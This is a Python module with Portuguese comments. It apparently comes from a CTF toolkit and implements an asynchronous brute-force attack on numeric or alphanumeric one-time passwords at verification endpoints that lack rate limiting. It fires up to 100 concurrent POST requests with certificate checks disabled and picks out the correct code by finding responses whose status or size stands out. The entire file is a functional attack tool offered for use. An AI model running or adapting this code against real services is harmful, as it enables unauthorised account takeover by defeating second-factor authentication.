#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Módulo: otp_bruteforce.py

Brute force de OTP numérico de N dígitos em endpoints sem rate limit.

Inspirado na vulnerabilidade real encontrada no CTF:
  - Painel admin acessível via rota escondida (security by obscurity)
  - OTP de 4 dígitos (10.000 combinações)
  - Sem CAPTCHA, sem limite de tentativas
  - Estratégia: disparar requisições em paralelo (asyncio) e identificar
    a resposta que difere das demais (status ou tamanho de resposta).
"""

import asyncio
import json
import string
import time
from itertools import product
from typing import Any

import aiohttp


# ─────────────────────────────────────────────────────────────────────────────
#  GERADOR DE CANDIDATOS
# ─────────────────────────────────────────────────────────────────────────────

def gerar_otps(digitos: int = 4, tipo: str = "numerico") -> list[str]:
    """
    Gera todos os candidatos de OTP com `digitos` dígitos.

    tipo:
        'numerico'     → 0000..9999   (10^N combinações)
        'alfanumerico' → a-z0-9       (36^N combinações — cuidado com volumes)
    """
    if tipo == "numerico":
        alfabeto = string.digits
    elif tipo == "alfanumerico":
        alfabeto = string.ascii_lowercase + string.digits
    else:
        raise ValueError(f"Tipo inválido: '{tipo}'. Use 'numerico' ou 'alfanumerico'.")

    return ["".join(c) for c in product(alfabeto, repeat=digitos)]


# ─────────────────────────────────────────────────────────────────────────────
#  WORKER ASSÍNCRONO
# ─────────────────────────────────────────────────────────────────────────────

async def _tentar_otp(
    session: aiohttp.ClientSession,
    url: str,
    payload_template: dict,
    campo_otp: str,
    headers: dict,
    candidato: str,
    semaforo: asyncio.Semaphore,
) -> dict[str, Any]:
    """Tenta um candidato OTP e retorna status + tamanho da resposta."""
    async with semaforo:
        payload = {**payload_template, campo_otp: candidato}
        inicio = time.monotonic()
        try:
            async with session.post(
                url, json=payload, headers=headers, ssl=False
            ) as resp:
                corpo = await resp.text()
                return {
                    "otp": candidato,
                    "status": resp.status,
                    "tamanho": len(corpo),
                    "duracao_ms": round((time.monotonic() - inicio) * 1000, 1),
                    "corpo": corpo[:200],
                }
        except Exception as exc:
            return {
                "otp": candidato,
                "status": "ERR",
                "tamanho": 0,
                "duracao_ms": round((time.monotonic() - inicio) * 1000, 1),
                "corpo": str(exc)[:80],
            }


# ─────────────────────────────────────────────────────────────────────────────
#  FUNÇÃO PRINCIPAL DO MÓDULO
# ─────────────────────────────────────────────────────────────────────────────

async def otp_bruteforce(
    url: str,
    payload_str: str,
    headers_str: str,
    campo_otp: str = "otp",
    digitos: int = 4,
    tipo: str = "numerico",
    concorrencia: int = 100,
    timeout_seg: int = 20,
) -> list[dict[str, Any]]:
    """
    Realiza brute force assíncrono de OTP numérico.

    Estratégia de detecção de hit:
      - A resposta que apresentar status HTTP diferente da moda (maioria)
        é classificada como candidata a OTP correto.
      - Alternativamente, se o tamanho da resposta for diferente, também é alertado.

    Parâmetros
    ----------
    url           : endpoint de verificação do OTP
    payload_str   : JSON base da requisição (ex: {"email": "admin@email.com"})
    headers_str   : JSON dos headers HTTP
    campo_otp     : nome do campo OTP no payload (padrão: "otp")
    digitos       : quantidade de dígitos do OTP (padrão: 4 → 10.000 combos)
    tipo          : 'numerico' ou 'alfanumerico'
    concorrencia  : máximo de requisições simultâneas (padrão: 100)
    timeout_seg   : timeout por requisição (padrão: 20s)
    """
    print(f"\n{'═'*64}")
    print("  MÓDULO 4 — OTP BRUTE FORCE")
    print(f"{'═'*64}")
    print(f"  URL         : {url}")
    print(f"  Campo OTP   : {campo_otp}")
    print(f"  Dígitos     : {digitos}  ({tipo})")
    print(f"  Concorrência: {concorrencia} req/vez")
    print(f"{'─'*64}\n")

    try:
        payload_base = json.loads(payload_str)
    except json.JSONDecodeError as e:
        raise ValueError(f"[ERRO] Payload JSON inválido: {e}") from e

    try:
        headers = json.loads(headers_str)
    except json.JSONDecodeError as e:
        raise ValueError(f"[ERRO] Headers JSON inválidos: {e}") from e

    candidatos = gerar_otps(digitos, tipo)
    total = len(candidatos)
    print(f"[*] Total de candidatos: {total:,}")
    print(f"[*] Iniciando brute force assíncrono...\n")

    semaforo = asyncio.Semaphore(concorrencia)
    timeout = aiohttp.ClientTimeout(total=timeout_seg)
    connector = aiohttp.TCPConnector(limit=concorrencia, ssl=False)

    todos_resultados: list[dict[str, Any]] = []
    suspeitos: list[dict[str, Any]] = []

    # Processar em lotes para mostrar progresso
    lote_size = min(concorrencia * 5, 1000)
    inicio_geral = time.monotonic()

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for i in range(0, total, lote_size):
            lote = candidatos[i : i + lote_size]
            tarefas = [
                _tentar_otp(session, url, payload_base, campo_otp, headers, otp, semaforo)
                for otp in lote
            ]
            resultados_lote = await asyncio.gather(*tarefas)
            todos_resultados.extend(resultados_lote)

            pct = min((i + lote_size) / total * 100, 100)
            decorrido = time.monotonic() - inicio_geral
            print(
                f"  [progresso] {min(i+lote_size, total):,}/{total:,} "
                f"({pct:.0f}%)  |  {decorrido:.1f}s decorridos",
                end="\r",
                flush=True,
            )

    print()  # quebra linha após progresso

    # ── Análise estatística dos resultados ───────────────────────────────────
    from collections import Counter

    # Moda de status (resposta mais comum = "errado")
    status_counter: Counter = Counter(
        r["status"] for r in todos_resultados if r["status"] != "ERR"
    )
    if not status_counter:
        print("[ERRO] Todas as requisições falharam. Verifique URL e conectividade.\n")
        return []

    status_moda, _ = status_counter.most_common(1)[0]

    # Moda de tamanho
    tamanho_counter: Counter = Counter(
        r["tamanho"] for r in todos_resultados if r["status"] != "ERR"
    )
    tamanho_moda, _ = tamanho_counter.most_common(1)[0]

    # Identificar suspeitos
    for r in todos_resultados:
        if r["status"] == "ERR":
            continue
        status_diferente = r["status"] != status_moda
        tamanho_diferente = abs(r["tamanho"] - tamanho_moda) > 10
        if status_diferente or tamanho_diferente:
            motivo = []
            if status_diferente:
                motivo.append(f"status={r['status']} (esperado={status_moda})")
            if tamanho_diferente:
                motivo.append(f"tamanho={r['tamanho']} (esperado≈{tamanho_moda})")
            r["motivo"] = " | ".join(motivo)
            suspeitos.append(r)

    # ── Relatório ─────────────────────────────────────────────────────────────
    duracao_total = round(time.monotonic() - inicio_geral, 1)
    print(f"\n{'─'*64}")
    print(f"  RESULTADO — {duracao_total}s | {total:,} candidatos testados")
    print(f"  Status mais comum (errado): HTTP {status_moda}")
    print(f"  Tamanho mais comum (errado) : {tamanho_moda} bytes")
    print(f"\n  Suspeitos encontrados: {len(suspeitos)}")

    if suspeitos:
        print()
        for s in suspeitos:
            print(f"  🎯  OTP CANDIDATO: '{s['otp']}'")
            print(f"      Motivo        : {s['motivo']}")
            print(f"      Resposta      : {s['corpo'][:100]}")
            print()
    else:
        print("    Nenhum OTP se destacou. Verifique se há rate limit ou se o endpoint é correto.\n")

    print("[✓] OTP Brute Force concluído.\n")
    return suspeitos
